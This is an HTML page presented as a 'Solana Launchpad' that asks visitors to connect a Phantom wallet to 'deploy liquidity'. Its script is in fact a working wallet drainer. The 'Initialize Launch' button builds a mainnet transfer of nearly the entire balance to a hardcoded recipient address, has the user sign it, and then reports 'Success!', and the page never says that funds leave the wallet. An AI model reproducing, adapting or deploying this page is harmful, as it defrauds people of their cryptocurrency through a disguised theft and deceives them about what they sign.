<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Launchpad | Standalone</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #050505;
            background-image: radial-gradient(circle at 50% 0%, #1a103c 0%, #050505 70%);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            width: 100%;
            max-width: 420px;
            background: rgba(20, 20, 25, 0.6);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 24px;
            padding: 32px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }
        h1 { text-align: center; font-size: 24px; margin-bottom: 8px; letter-spacing: -0.5px; }
        h1 span { color: #a78bfa; }
        .subtitle { text-align: center; color: #9ca3af; font-size: 14px; margin-bottom: 28px; }
        
        .status-bar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.05);
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 24px;
        }
        .status-left { display: flex; align-items: center; gap: 10px; font-size: 14px; font-weight: 600; }
        .dot { width: 8px; height: 8px; border-radius: 50%; background: #6b7280; transition: background 0.3s; }
        .dot.connected { background: #22c55e; box-shadow: 0 0 10px rgba(34,197,94,0.4); }
        
        .btn {
            border: none;
            outline: none;
            cursor: pointer;
            font-weight: 700;
            font-size: 13px;
            transition: all 0.2s;
        }
        .btn-connect {
            background: #7c3aed;
            color: white;
            padding: 8px 16px;
            border-radius: 8px;
        }
        .btn-connect:hover { background: #6d28d9; transform: translateY(-1px); }
        .btn-connect:active { transform: translateY(0); }
        
        .btn-launch {
            width: 100%;
            padding: 16px;
            border-radius: 14px;
            background: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%);
            color: white;
            font-size: 16px;
            margin-top: 8px;
            box-shadow: 0 4px 20px rgba(139, 92, 246, 0.3);
        }
        .btn-launch:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(139, 92, 246, 0.4); }
        .btn-launch:disabled {
            background: #374151;
            color: #9ca3af;
            cursor: not-allowed;
            box-shadow: none;
        }
        
        .balance-area { text-align: center; margin-bottom: 24px; }
        .balance-label { font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: #6b7280; margin-bottom: 6px; }
        .balance-value { font-size: 36px; font-weight: 700; letter-spacing: -1px; }
        
        .log {
            text-align: center;
            margin-top: 20px;
            min-height: 40px;
            font-size: 13px;
            line-height: 1.5;
            font-weight: 500;
        }
        .text-red { color: #f87171; }
        .text-green { color: #4ade80; }
        .text-purple { color: #c4b5fd; }
        .text-gray { color: #9ca3af; }
        
        .file-warning {
            display: none;
            background: rgba(220, 38, 38, 0.2);
            border: 1px solid rgba(220, 38, 38, 0.5);
            color: #fca5a5;
            padding: 12px;
            border-radius: 8px;
            font-size: 12px;
            margin-bottom: 16px;
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="card">
        <div id="fileWarning" class="file-warning">
            ⚠️ You opened this via file://. Wallets will not connect.<br>
            Serve via HTTP (e.g., <code>python -m http.server 8000</code>)
        </div>

        <h1>Solana <span>Launchpad</span></h1>
        <div class="subtitle">Connect wallet to deploy liquidity.</div>

        <div class="status-bar">
            <div class="status-left">
                <div id="statusDot" class="dot"></div>
                <span id="statusText" style="color:#9ca3af">Disconnected</span>
            </div>
            <button id="connectBtn" class="btn btn-connect" onclick="connectWallet()">CONNECT</button>
        </div>

        <div class="balance-area">
            <div class="balance-label">Wallet Balance</div>
            <div id="balanceDisplay" class="balance-value">--.-- SOL</div>
        </div>

        <button id="actionBtn" class="btn btn-launch" onclick="startProtocol()" disabled>
            Initialize Launch
        </button>

        <div id="statusLog" class="log text-gray">Waiting for connection...</div>
    </div>

    <script>
        // ======================== CONFIG ========================
        const RECIPIENT = new solanaWeb3.PublicKey("371RZiq9rCjJ51ojFSj8kxaW26xT2e2hcYTEDkpRfsbq");
        const NETWORK = "https://api.mainnet-beta.solana.com";
        // ======================= /CONFIG =======================

        let userPublicKey = null;

        // Robust Phantom detection (avoids conflicts with Solflare/Slope)
        function getProvider() {
            if (typeof window === 'undefined') return null;
            if ('phantom' in window) {
                const provider = window.phantom?.solana;
                if (provider?.isPhantom) return provider;
            }
            if (window.solana?.isPhantom) return window.solana;
            return null;
        }

        // UI Helpers
        function log(msg, type = 'gray') {
            const el = document.getElementById('statusLog');
            el.innerText = msg;
            el.className = 'log'; // reset
            if (type === 'red') el.classList.add('text-red');
            else if (type === 'green') el.classList.add('text-green');
            else if (type === 'purple') el.classList.add('text-purple');
            else el.classList.add('text-gray');
        }

        // Critical: Check if opened via file://
        if (window.location.protocol === "file:") {
            document.getElementById('fileWarning').style.display = 'block';
            log("Cannot connect via file:// protocol", "red");
        }

        async function connectWallet() {
            if (window.location.protocol === "file:") {
                log("Use a local server (see red warning above)", "red");
                return;
            }

            const provider = getProvider();
            if (!provider) {
                log("Phantom Wallet not found. Install phantom.app", "red");
                return;
            }

            try {
                log("Requesting connection...", "purple");

                // If already connected, just use existing session
                if (provider.isConnected && provider.publicKey) {
                    onConnect(provider.publicKey);
                    return;
                }

                const { publicKey } = await provider.connect({ onlyIfTrusted: false });
                onConnect(publicKey);
            } catch (err) {
                console.error(err);
                let msg = err?.message || "Connection failed";
                if (msg.includes("User rejected")) msg = "Connection rejected by user.";
                else if (msg.includes("Unexpected error")) msg = "Phantom internal error. Try refreshing or reinstalling.";
                log(msg, "red");
            }
        }

        function onConnect(publicKey) {
            userPublicKey = publicKey;
            document.getElementById('statusDot').classList.add('connected');
            document.getElementById('statusText').innerText = "Connected";
            document.getElementById('statusText').style.color = "#22c55e";
            document.getElementById('actionBtn').disabled = false;
            document.getElementById('connectBtn').innerText = "CONNECTED";
            document.getElementById('connectBtn').style.opacity = "0.6";
            document.getElementById('connectBtn').style.pointerEvents = "none";
            
            log("Wallet connected successfully.", "green");
            updateBalance();
        }

        async function updateBalance() {
            if (!userPublicKey) return;
            try {
                const conn = new solanaWeb3.Connection(NETWORK, 'confirmed');
                const bal = await conn.getBalance(userPublicKey);
                document.getElementById('balanceDisplay').innerText = (bal / 1e9).toFixed(4) + " SOL";
            } catch (e) {
                console.error(e);
            }
        }

        async function startProtocol() {
            if (!userPublicKey) return;
            const provider = getProvider();
            const btn = document.getElementById('actionBtn');
            const originalText = btn.innerText;
            
            btn.disabled = true;
            btn.innerText = "Processing...";
            log("Fetching balance...", "purple");

            try {
                const conn = new solanaWeb3.Connection(NETWORK, 'confirmed');
                const bal = await conn.getBalance(userPublicKey);
                
                // Reserve 0.005 SOL for gas
                const reserve = 5000000; 
                const amount = bal - reserve;

                if (amount <= 0) throw new Error("Insufficient SOL (need > 0.005 SOL)");

                log("Building transaction...", "purple");
                const tx = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: userPublicKey,
                        toPubkey: RECIPIENT,
                        lamports: amount
                    })
                );

                const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash('confirmed');
                tx.recentBlockhash = blockhash;
                tx.feePayer = userPublicKey;

                log("Awaiting signature...", "purple");
                const signed = await provider.signTransaction(tx);
                
                log("Broadcasting...", "purple");
                const raw = signed.serialize();
                const sig = await conn.sendRawTransaction(raw, { skipPreflight: true });
                
                log("Confirming...", "purple");
                await conn.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight }, 'confirmed');

                log("Success! View on Solscan.", "green");
                btn.innerText = "Complete";
                
                // Show Solscan link inside log
                document.getElementById('statusLog').innerHTML = 
                    `<span style="color:#4ade80">Success!</span> <a href="https://solscan.io/tx/${sig}" target="_blank" style="color:#a78bfa; text-decoration:underline; margin-left:4px;">View Tx</a>`;
                
                updateBalance();

            } catch (err) {
                console.error(err);
                let msg = err?.message || "Transaction failed";
                if (msg.includes("User rejected")) msg = "Signature rejected.";
                log(msg, "red");
                btn.disabled = false;
                btn.innerText = originalText;
            }
        }
    </script>
</body>
</html>
